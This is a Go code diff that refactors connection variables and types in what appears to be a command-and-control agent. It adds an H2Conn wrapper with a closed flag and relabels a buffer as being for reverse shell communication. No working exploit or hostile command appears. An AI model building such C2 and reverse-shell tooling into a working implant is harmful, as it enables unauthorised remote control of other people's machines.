@@ -14,14 +14,11 @@ var (
 	// HTTPClient handles agent's http communication
 	HTTPClient = tun.EmpHTTPClient()
 
-	// H2Conn the connection to CC, for JSON message-based communication
-	H2Conn *h2conn.Conn
+	// H2Json the connection to CC, for JSON message-based communication
+	H2Json *h2conn.Conn
 
 	// H2Stream used for buffered constant stream
-	H2Stream *h2conn.Conn
-
-	// H2StreamDone whether H2Stream is finished
-	H2StreamDone bool
+	H2Stream H2Conn
 
 	// RecvCC used for receiving data from CC
 	RecvCC = make(chan []byte)
@@ -46,7 +43,7 @@ const (
 	// OpSep separator of CC payload
 	OpSep = "cb433bd1-354c-4802-a4fa-ece518f3ded1"
 
-	// BufSize buffer size for CC/agent communication
+	// BufSize buffer size for reverse shell communication
 	BufSize = 1
 )
 
@@ -67,4 +64,10 @@ type SystemInfo struct {
 type TunData struct {
 	Payload string `json:"payload"` // payload
 	Tag     string `json:"tag"`     // tag of the agent
+}
+
+// H2Conn add `IsClosed` to h2conn.Conn
+type H2Conn struct {
+	Conn     *h2conn.Conn
+	IsClosed bool
 }
